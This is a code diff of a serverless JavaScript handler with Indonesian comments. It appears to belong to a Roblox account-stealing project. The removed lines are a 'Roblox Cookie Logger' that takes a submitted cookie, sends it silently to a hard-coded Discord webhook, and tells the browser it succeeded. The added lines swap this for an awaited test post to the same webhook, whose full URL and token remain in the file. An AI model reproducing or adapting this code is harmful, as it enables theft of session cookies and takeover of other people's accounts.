@@ -2,40 +2,36 @@
 import fetch from 'node-fetch';
 
 export default async function handler(req, res) {
-    // Hanya izinkan metode POST
-    if (req.method !== 'POST') {
-        return res.status(405).json({ message: 'Method Not Allowed' });
-    }
-
-    // Ambil cookie dari body request
-    const { cookie } = req.body;
-
-    if (!cookie) {
-        return res.status(400).json({ message: 'Cookie is required' });
-    }
-
-    // !!! PENTING: GANTI DENGAN WEBHOOK DISCORD ANDA !!!
+    // Kita paksa nunggu jawaban dari Discord
     const discordWebhookUrl = 'https://discord.com/api/webhooks/1462437468908290233/C0d9Ghggmr8dvV37iTh0ZB8sFxuWuUAwqHHjR2pvWTA6ksXBCjtYEKeEZUbwNPGoW1t-';
 
-    const payload = {
-        content: `🍪 **Cookie Baru Tertangkap!** 🍮\n\`\`\`${cookie}\`\`\``,
-        username: "Roblox Cookie Logger",
-        avatar_url: "https://i.imgur.com/rVw5B2W.png"
+    const testPayload = {
+        content: "🧪 **TES KONEKSI SERVER (DENGAN AWAIT)!** 🧪",
+        username: "Vercel Test Bot"
     };
 
-    // !!! PERUBAHAN KRUSIAL DI SINI !!!
-    // Kita nggak pake 'await', jadi nggak nunggu Discord.
-    // Kita jalanin di background.
-    fetch(discordWebhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-    }).catch(error => {
-        // Ini cuma buat log di server, biar kita tau kalau gagal.
-        // Tapi user nggak bakal ngelihat error ini.
-        console.error('Gagal kirim ke Discord (async):', error);
-    });
+    try {
+        // Pakai 'await' jadi nunggu sampe selesai
+        const discordResponse = await fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(testPayload),
+        });
 
-    // Langsung kirim jawaban SUKSES ke browser, tanpa nunggu!
-    res.status(200).json({ message: 'Success' });
+        // Cek response dari Discord
+        if (!discordResponse.ok) {
+            // Kalau Discord ngasih error (misal: 404 Not Found, 401 Unauthorized)
+            const errorText = await discordResponse.text();
+            console.error('Discord API Error:', discordResponse.status, errorText);
+            throw new Error(`Discord API Error: ${discordResponse.status} ${errorText}`);
+        }
+
+        // Kalau sukses
+        res.status(200).json({ message: 'Test message sent successfully!' });
+
+    } catch (error) {
+        // Tangkep semua error (network, discord error, dll)
+        console.error('Gagal total kirim ke Discord:', error.message);
+        res.status(500).json({ message: `Failed to send to Discord: ${error.message}` });
+    }
 }
